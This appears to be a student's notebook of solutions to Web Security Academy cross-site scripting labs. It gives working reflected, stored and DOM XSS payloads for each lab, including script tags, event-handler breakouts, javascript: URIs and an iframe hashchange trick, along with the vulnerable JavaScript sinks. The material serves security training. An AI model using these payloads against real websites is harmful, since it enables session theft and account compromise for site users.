# %% [markdown]
# * **Reflected XSS into HTML context with nothing encoded Lab :**
#
#      * XSS On Search Field
#
#      * **Payload :**
#
#          ```text
#          <script>alert(11)</script>
#          ```
#
# ***
# ***
#
# * **Stored XSS into HTML context with nothing encoded Lab :**
#
#      * XSS On Comments
#
#      * **Payload :**
#
#          ```text
#          <script>confirm(0)</script>
#          ```
#
# ***
# ***
#
# * **DOM XSS in document.write sink using source location.search Lab :**
#
#
#      * Vulnerable JS Code :
#
#          ```JS
#          function trackSearch(query) {
#              document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
#          }
#          var query = (new URLSearchParams(window.location.search)).get('search');
#          if(query) {
#              trackSearch(query);
#          }
#          ```
#
#          * search Parameter is Vulnerable
#
#      * **Payloads :**
#
#          ```text
#          X"<svg onload=prompt(1)>'
#
#          X"><script>prompt(1)</script>
#          ```
#
# ***
# ***
#
# * **DOM XSS in innerHTML sink using source location.search Lab :**
#
#
#      * **Payload :**
#
#          ```text
#          <img src=x onerror="alert(1)">
#          ```
#
#
# ***
# ***
#
# * **DOM XSS in jQuery anchor href attribute sink using location.search source Lab :**
#
#      * XSS on **Submit Feedback** Page at **<Back** Button On **returnPath** Parameter
#
#      * Change returnPath to Your Payload With onclick Event
#
#      * **Payload :**
#
#          ```text
#          javascript: onclick=alert(1)
#          ```
#
#
# ***
# ***
#
# * **DOM XSS in jQuery selector sink using a hashchange event Lab :**
#
#      * **Payload :**
#
#          ```text
#          <iframe src="https://0a780059038fb15c80d4da9c00340094.web-security-academy.net/#%3Cimg%20src=X%20onerror=print()%3E" onload="this.src+='A'">
#          ```
#
#
# ***
# ***
#
# * **Reflected XSS into attribute with angle brackets HTML-encoded Lab :**
#
#      * Angel Brackets <> Are HTML Encoded
#
#      * **Payloads :**
#
#          ```text
#          X" onmouseover="alert(1)
#          ```
#
#          * Triggered when Mouse Passes Over The Search Bar
#
#
#          ```text
#          X" onfocus="alert('GG Ebl3')
#          ```
#
#          * Triggered when You Click the Search Bar
#
# ***
# ***
#
# * **Stored XSS into anchor href attribute with double quotes HTML-encoded Lab :**
#
#      * DOM XSS on **website**
#
#      * Intercept The Request and Change **website** Parameter to Your Payload
#
#      * **Payload :**
#
#          ```text
#          javascript:alert(1)
#          ```
#
#
# ***
# ***
#
# * **Reflected XSS into a JavaScript string with angle brackets HTML encoded Lab :**
#
#      * Search For any Random Input like X'><" and Open Page Source and Search Where Did your input reflect
#
#      * It Reflected in Two Places , inside h1 tag but it is encoded so there is no XSS bug . The Second Place at the Following JS Code
#
#          ```JS
#          var searchTerms = 'X';
#          document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
#
#          ```
#
#          * Where **X** is your Search input
#
#          * So We Can Manipulate this and Inject Our Payload as It Injected without any encoding
#
#          * **Payload :**
#
#              ```text
#              X';alert(1);//
#              ```
